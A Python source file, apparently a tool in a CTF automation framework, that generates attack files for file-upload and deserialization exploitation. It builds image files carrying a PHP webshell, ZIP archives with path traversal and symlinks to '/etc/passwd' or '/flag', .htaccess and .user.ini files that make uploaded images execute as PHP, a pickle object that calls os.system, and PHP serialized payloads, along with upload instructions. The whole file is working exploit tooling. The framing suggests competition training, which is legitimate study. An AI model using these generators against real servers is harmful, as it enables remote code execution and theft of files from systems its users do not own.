# tools/file_creator_tool.py
# 文件创建工具 - 用于生成各类 CTF 测试文件
import os
import base64
import struct
import time
import zipfile
import zlib
import io
from typing import Dict, Any
from tool_framework import CTFTool


class FileCreatorTool(CTFTool):
    """
    通用文件创建工具
    支持创建：
    1. 图片马 (GIF/PNG/JPG with PHP payload)
    2. 压缩包 (ZIP with traversal or symlink)
    3. 序列化文件 (pickle, PHP serialize)
    4. 配置文件 (.htaccess, .user.ini)
    5. 自定义内容文件
    """

    OUTPUT_DIR = os.path.join("data", "tool_outputs")

    def __init__(self):
        os.makedirs(self.OUTPUT_DIR, exist_ok=True)

    def name(self) -> str:
        return "file-creator"

    def description(self) -> str:
        return "通用文件创建工具，生成图片马、压缩包、配置文件等 CTF 常用文件"

    def supported_vulns(self) -> list:
        return ["File Upload", "File Inclusion", "Path Traversal", "Configuration Bypass"]

    def check_available(self) -> bool:
        return True

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "file_type": {
                "type": "str",
                "description": "文件类型: 'image_php' (图片马), 'zip' (压缩包), 'zip_traversal' (路径穿越压缩包), "
                               "'zip_symlink' (符号链接压缩包), 'htaccess' (.htaccess), 'user_ini' (.user.ini), "
                               "'pickle' (Python pickle), 'php_serialize' (PHP序列化), 'custom' (自定义)",
                "required": True
            },
            "payload": {
                "type": "str",
                "description": "Payload 内容 (如 PHP 代码: <?php system($_GET['c']);?>)",
                "required": False,
                "default": "<?php system($_GET['c']);?>"
            },
            "filename": {
                "type": "str",
                "description": "输出文件名，不填则自动生成",
                "required": False
            },
            "image_type": {
                "type": "str",
                "description": "图片类型 (file_type=image_php 时): 'gif', 'png', 'jpg'",
                "required": False,
                "default": "gif"
            },
            "traversal_depth": {
                "type": "int",
                "description": "路径穿越深度 (file_type=zip_traversal 时)",
                "required": False,
                "default": 5
            },
            "symlink_target": {
                "type": "str",
                "description": "符号链接目标 (file_type=zip_symlink 时)，如 '/flag', '/etc/passwd'",
                "required": False,
                "default": "/flag"
            },
            "custom_content": {
                "type": "str",
                "description": "自定义文件内容 (file_type=custom 时)",
                "required": False
            },
            "custom_extension": {
                "type": "str",
                "description": "自定义文件扩展名 (file_type=custom 时)，如 'php', 'phtml'",
                "required": False,
                "default": "txt"
            }
        }

    def execute(self, target: str, params: Dict) -> Dict:
        file_type = params.get("file_type", "custom")
        payload = params.get("payload", "<?php system($_GET['c']);?>")
        filename = params.get("filename", f"file_{int(time.time())}")

        try:
            filepath = None
            extra_info = {}

            if file_type == "image_php":
                filepath, extra_info = self._create_image_php(payload, filename, params)

            elif file_type == "zip":
                filepath = self._create_zip(payload, filename)

            elif file_type == "zip_traversal":
                depth = params.get("traversal_depth", 5)
                filepath, extra_info = self._create_zip_traversal(payload, filename, depth)

            elif file_type == "zip_symlink":
                symlink_target = params.get("symlink_target", "/flag")
                filepath, extra_info = self._create_zip_symlink(filename, symlink_target)

            elif file_type == "htaccess":
                filepath = self._create_htaccess(payload, filename)

            elif file_type == "user_ini":
                filepath = self._create_user_ini(payload, filename)

            elif file_type == "pickle":
                filepath = self._create_pickle(payload, filename)

            elif file_type == "php_serialize":
                filepath = self._create_php_serialize(payload, filename)

            elif file_type == "custom":
                content = params.get("custom_content", payload)
                ext = params.get("custom_extension", "txt")
                filepath = self._create_custom(content, filename, ext)

            else:
                return {"success": False, "error": f"未知文件类型: {file_type}"}

            if filepath and os.path.exists(filepath):
                return {
                    "success": True,
                    "file_path": filepath,
                    "file_type": file_type,
                    "size": os.path.getsize(filepath),
                    "extra": extra_info,
                    "usage": f"使用 requests 工具上传此文件: files={{'file': open('{filepath}', 'rb')}}",
                    "summary": f"文件已创建: {filepath}"
                }
            else:
                return {"success": False, "error": "文件创建失败"}

        except Exception as e:
            return {"success": False, "error": str(e), "summary": f"创建失败: {str(e)}"}

    def _create_image_php(self, payload: str, filename: str, params: Dict) -> tuple:
        """创建图片马"""

        image_type = params.get("image_type", "gif")
        filepath = os.path.join(self.OUTPUT_DIR, f"{filename}.{image_type}")

        if image_type == "gif":
            # GIF89a 头 + payload
            content = b"GIF89a" + b"\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00"
            content += payload.encode('utf-8', errors='ignore')

        elif image_type == "png":
            # 最小有效 PNG 文件
            # PNG signature
            png_sig = b'\x89PNG\r\n\x1a\n'
            # IHDR chunk (1x1 RGB)
            ihdr = b'\x00\x00\x00\x0dIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde'
            # IDAT chunk (minimal image data)
            idat = b'\x00\x00\x00\x0cIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4'
            # IEND chunk
            iend = b'\x00\x00\x00\x00IEND\xaeB`\x82'
            # 在 IDAT 后插入 payload
            content = png_sig + ihdr + idat + payload.encode('utf-8', errors='ignore') + iend

        elif image_type == "jpg":
            # 最小 JPEG 文件头
            # SOI + APP0 + DQT + SOF0 + DHT + SOS + EOI
            jpg_header = (
                b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
                b'\xff\xdb\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\t'
                b'\x08\n\x0c\x14\r\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d\x1a\x1f\x1e'
                b'\x1d\x1a\x1c\x1c $.\' ",#\x1c\x1c(7),01444\x1f\'=;<83\x18\x00'
                b'\x00\x01\x01\x00\x00?'
            )
            content = jpg_header + payload.encode('utf-8', errors='ignore') + b'\xff\xd9'
        else:
            content = payload.encode('utf-8')

        with open(filepath, "wb") as f:
            f.write(content)

        extra = {
            "image_type": image_type,
            "note": "图片头已添加，可绕过简单文件类型检测",
            "verify_command": f"file {filepath}"
        }

        return filepath, extra

    def _create_zip(self, payload: str, filename: str) -> str:
        """创建包含 payload 的 ZIP 文件"""

        filepath = os.path.join(self.OUTPUT_DIR, f"{filename}.zip")

        with zipfile.ZipFile(filepath, 'w', zipfile.ZIP_DEFLATED) as zf:
            # 添加一个 PHP 文件
            zf.writestr("shell.php", payload)
            # 添加一个正常文件作为掩护
            zf.writestr("readme.txt", "This is a normal file.")

        return filepath

    def _create_zip_traversal(self, payload: str, filename: str, depth: int) -> tuple:
        """创建路径穿越 ZIP 文件"""

        filepath = os.path.join(self.OUTPUT_DIR, f"{filename}_traversal.zip")

        # 构建穿越路径
        traversal = "../" * depth + "shell.php"

        # 手动构建 ZIP 以支持路径穿越
        with open(filepath, 'wb') as f:
            # Local file header
            f.write(b'PK\x03\x04')  # signature
            f.write(struct.pack('<H', 10))  # version
            f.write(struct.pack('<H', 0))   # flags
            f.write(struct.pack('<H', 0))   # compression
            f.write(struct.pack('<HH', 0, 0))  # time, date

            payload_bytes = payload.encode('utf-8')
            crc = zlib.crc32(payload_bytes) & 0xffffffff

            f.write(struct.pack('<I', crc))  # crc32
            f.write(struct.pack('<I', len(payload_bytes)))  # compressed size
            f.write(struct.pack('<I', len(payload_bytes)))  # uncompressed size
            f.write(struct.pack('<H', len(traversal)))  # filename length
            f.write(struct.pack('<H', 0))  # extra field length
            f.write(traversal.encode('utf-8'))  # filename with traversal
            f.write(payload_bytes)  # file data

            # Central directory
            cd_offset = f.tell()
            f.write(b'PK\x01\x02')  # signature
            f.write(struct.pack('<HHHHHH', 0, 10, 0, 0, 0, 0))  # versions, flags, compression
            f.write(struct.pack('<HH', 0, 0))  # time, date
            f.write(struct.pack('<I', crc))
            f.write(struct.pack('<II', len(payload_bytes), len(payload_bytes)))
            f.write(struct.pack('<H', len(traversal)))
            f.write(struct.pack('<HHH', 0, 0, 0))
            f.write(struct.pack('<I', 0))  # external attrs
            f.write(struct.pack('<I', 0))  # local header offset
            f.write(traversal.encode('utf-8'))

            # End of central directory
            f.write(b'PK\x05\x06')
            f.write(struct.pack('<HHHHIIH', 0, 0, 1, 1,
                               f.tell() - cd_offset, cd_offset, 0))

        extra = {
            "traversal_path": traversal,
            "depth": depth,
            "note": f"解压时文件会写入 {traversal}",
            "target_location": f"../../{'..'*depth}/shell.php"
        }

        return filepath, extra

    def _create_zip_symlink(self, filename: str, symlink_target: str) -> tuple:
        """创建包含符号链接的 ZIP 文件"""

        filepath = os.path.join(self.OUTPUT_DIR, f"{filename}_symlink.zip")

        with open(filepath, 'wb') as f:
            # 符号链接内容就是目标路径
            link_content = symlink_target.encode('utf-8')

            # Local file header for symlink
            f.write(b'PK\x03\x04')
            f.write(struct.pack('<H', 20))  # version 2.0 for symlinks
            f.write(struct.pack('<H', 0))
            f.write(struct.pack('<H', 8))   # compression = deflate
            f.write(struct.pack('<HH', 0, 0))

            # Compress the link target
            compressed = zlib.compress(link_content)[2:-4]  # strip zlib header/trailer
            crc = zlib.crc32(link_content) & 0xffffffff

            f.write(struct.pack('<I', crc))
            f.write(struct.pack('<I', len(compressed)))
            f.write(struct.pack('<I', len(link_content)))
            f.write(struct.pack('<H', len("link")))  # filename
            f.write(struct.pack('<H', 0))
            f.write(b"link")  # filename
            f.write(compressed)

            # Central directory
            cd_offset = f.tell()
            f.write(b'PK\x01\x02')
            f.write(struct.pack('<HHHHHH', 20, 20, 0, 8, 0, 0))
            f.write(struct.pack('<HH', 0, 0))
            f.write(struct.pack('<I', crc))
            f.write(struct.pack('<II', len(compressed), len(link_content)))
            f.write(struct.pack('<H', len("link")))
            f.write(struct.pack('<HHH', 0, 0, 0))
            f.write(struct.pack('<I', 0xA1FF0000))  # symlink attrs
            f.write(struct.pack('<I', 0))
            f.write(b"link")

            # End of central directory
            f.write(b'PK\x05\x06')
            f.write(struct.pack('<HHHHIIH', 0, 0, 1, 1,
                               f.tell() - cd_offset, cd_offset, 0))

        extra = {
            "symlink_target": symlink_target,
            "note": f"解压后创建指向 {symlink_target} 的符号链接",
            "usage": "上传后访问 link 文件即可读取目标文件"
        }

        return filepath, extra

    def _create_htaccess(self, payload: str, filename: str) -> str:
        """创建 .htaccess 文件"""

        filepath = os.path.join(self.OUTPUT_DIR, f".htaccess")

        # 默认 .htaccess 配置：允许执行 PHP
        if payload == "<?php system($_GET['c']);?>":
            content = """AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .png
AddType application/x-httpd-php .gif
AddType application/x-httpd-php .txt

# 允许上传的文件执行 PHP
<FilesMatch "\\.(jpg|png|gif|txt)$">
    SetHandler application/x-httpd-php
</FilesMatch>
"""
        else:
            content = payload

        with open(filepath, "w") as f:
            f.write(content)

        return filepath

    def _create_user_ini(self, payload: str, filename: str) -> str:
        """创建 .user.ini 文件 (PHP-FPM 场景)"""

        filepath = os.path.join(self.OUTPUT_DIR, f".user.ini")

        if payload == "<?php system($_GET['c']);?>":
            content = """; .user.ini - PHP-FPM 配置覆盖
; 自动包含木马文件
auto_prepend_file=shell.jpg
auto_append_file=shell.jpg

; 或者直接执行代码 (PHP 7.0+)
; auto_prepend_file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
"""
        else:
            content = payload

        with open(filepath, "w") as f:
            f.write(content)

        return filepath

    def _create_pickle(self, payload: str, filename: str) -> str:
        """创建 Python pickle payload 文件"""

        import pickle
        import os

        filepath = os.path.join(self.OUTPUT_DIR, f"{filename}.pickle")

        # 创建 RCE pickle payload
        class RCE:
            def __reduce__(self):
                import os
                return (os.system, (payload,))

        # 创建一个临时类来生成 payload
        payload_obj = RCE()
        pickled = pickle.dumps(payload_obj)

        with open(filepath, "wb") as f:
            f.write(pickled)

        return filepath

    def _create_php_serialize(self, payload: str, filename: str) -> str:
        """创建 PHP 序列化文件"""

        filepath = os.path.join(self.OUTPUT_DIR, f"{filename}.ser")

        # 简单的 PHP 序列化 payload
        # O:8:"Exploit":1:{s:3:"cmd";s:XX:"payload";}
        cmd_len = len(payload)
        serialized = f'O:8:"Exploit":1:{{s:3:"cmd";s:{cmd_len}:"{payload}";}}'

        with open(filepath, "w") as f:
            f.write(serialized)

        return filepath

    def _create_custom(self, content: str, filename: str, ext: str) -> str:
        """创建自定义文件"""

        filepath = os.path.join(self.OUTPUT_DIR, f"{filename}.{ext}")

        # 支持内容为 base64 编码
        if content.startswith("base64:"):
            import base64
            content = base64.b64decode(content[7:])
            with open(filepath, "wb") as f:
                f.write(content)
        else:
            with open(filepath, "w", encoding='utf-8') as f:
                f.write(content)

        return filepath